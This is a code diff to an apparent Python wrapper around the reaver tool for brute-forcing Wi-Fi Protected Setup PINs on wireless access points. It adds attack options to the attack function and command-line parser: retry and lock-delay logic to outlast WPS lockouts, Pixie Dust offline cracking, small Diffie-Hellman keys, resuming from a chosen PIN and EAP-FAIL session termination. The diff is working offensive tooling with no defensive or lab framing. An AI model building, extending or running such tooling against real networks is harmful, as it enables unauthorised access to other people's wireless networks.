@@ -1193,13 +1193,26 @@ def update_targets_table(results: List[AttackResult], stats: Dict, tui=None):
 def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackResult,
                       stats: Dict, all_results: List[AttackResult],
                       max_retries: int = 10, verbose: bool = False, tui=None,
-                      log_file=None, pixie_dust: bool = False) -> AttackResult:
+                      log_file=None, pixie_dust: bool = False,
+                      timeout: int = 10, delay: int = 3, lock_delay: int = 60,
+                      recurring_delay: str = None, win7: bool = False,
+                      dh_small: bool = False, start_pin: str = None,
+                      no_nacks: bool = False, eap_terminate: bool = False) -> AttackResult:
     """
     Run reaver against a single target with lock detection/retry logic.
     Updates result_obj in real-time for live progress display.
 
     Args:
         pixie_dust: If True, use Pixie Dust attack (-K 1) for faster offline cracking
+        timeout: Receive timeout in seconds (default: 10)
+        delay: Delay between PIN attempts in seconds (default: 3)
+        lock_delay: Time to wait if AP locks WPS (default: 60)
+        recurring_delay: Sleep pattern as "N:SEC" (e.g., "3:60")
+        win7: Mimic Windows 7 registrar behavior
+        dh_small: Use small Diffie-Hellman keys (faster)
+        start_pin: Start with specific PIN (for resuming)
+        no_nacks: Don't send NACK messages
+        eap_terminate: Terminate sessions with EAP FAIL
     """
     start_time = time.time()
     retry_count = 0
@@ -1218,19 +1231,45 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
         log_file.flush()
 
     while retry_count <= max_retries:
-        # Build reaver command
+        # Build reaver command with all options
         cmd = [
             "reaver",
             "-i", interface,
             "-b", target.bssid,
             "-c", target.channel,
-            "-d", "3",
+            "-d", str(delay),
+            "-T", str(timeout),
+            "-l", str(lock_delay),
             "-vv"
         ]
 
         # Add Pixie Dust flag if enabled
         if pixie_dust:
             cmd.extend(["-K", "1"])
+
+        # Add recurring delay if specified (format: "N:SEC")
+        if recurring_delay:
+            cmd.extend(["-r", recurring_delay])
+
+        # Add Windows 7 compatibility mode
+        if win7:
+            cmd.append("-W")
+
+        # Add small DH keys for faster crypto
+        if dh_small:
+            cmd.append("-S")
+
+        # Add start PIN for resuming
+        if start_pin:
+            cmd.extend(["-p", start_pin])
+
+        # Add no-nacks option
+        if no_nacks:
+            cmd.append("-n")
+
+        # Add EAP terminate option
+        if eap_terminate:
+            cmd.append("-E")
 
         if use_no_association:
             cmd.append("-N")
@@ -1729,7 +1768,16 @@ def run_main_logic(args, tui=None):
             verbose=args.verbose,
             tui=tui,
             log_file=reaver_log,
-            pixie_dust=args.pixie_dust
+            pixie_dust=args.pixie_dust,
+            timeout=args.timeout,
+            delay=args.delay,
+            lock_delay=args.lock_delay,
+            recurring_delay=args.recurring_delay,
+            win7=args.win7,
+            dh_small=args.dh_small,
+            start_pin=args.start_pin,
+            no_nacks=args.no_nacks,
+            eap_terminate=args.eap_terminate
         )
 
         # Update stats
@@ -1826,6 +1874,63 @@ def main():
         "--pixie-dust", "-K",
         action="store_true",
         help="use Pixie Dust attack (reaver -K 1) - faster offline attack exploiting weak RNG"
+    )
+
+    # Advanced reaver options
+    parser.add_argument(
+        "--timeout", "-T",
+        type=int,
+        default=10,
+        metavar="SEC",
+        help="reaver receive timeout in seconds (default: 10, increase for weak signals)"
+    )
+    parser.add_argument(
+        "--delay", "-d",
+        type=int,
+        default=3,
+        metavar="SEC",
+        help="delay between PIN attempts in seconds (default: 3)"
+    )
+    parser.add_argument(
+        "--lock-delay", "-l",
+        type=int,
+        default=60,
+        metavar="SEC",
+        help="time to wait if AP locks WPS in seconds (default: 60)"
+    )
+    parser.add_argument(
+        "--recurring-delay", "-r",
+        type=str,
+        default=None,
+        metavar="N:SEC",
+        help="sleep SEC seconds every N PIN attempts (e.g., '3:60' = sleep 60s every 3 attempts)"
+    )
+    parser.add_argument(
+        "--win7", "-W",
+        action="store_true",
+        help="mimic Windows 7 registrar behavior (better compatibility with some APs)"
+    )
+    parser.add_argument(
+        "--dh-small", "-S",
+        action="store_true",
+        help="use small Diffie-Hellman keys (speeds up crypto operations)"
+    )
+    parser.add_argument(
+        "--start-pin", "-p",
+        type=str,
+        default=None,
+        metavar="PIN",
+        help="start with a specific PIN (8 digits, for resuming attacks)"
+    )
+    parser.add_argument(
+        "--no-nacks",
+        action="store_true",
+        help="do not send NACK messages when out of order packets received"
+    )
+    parser.add_argument(
+        "--eap-terminate", "-E",
+        action="store_true",
+        help="terminate each WPS session with EAP FAIL packet"
     )
     args = parser.parse_args()
 
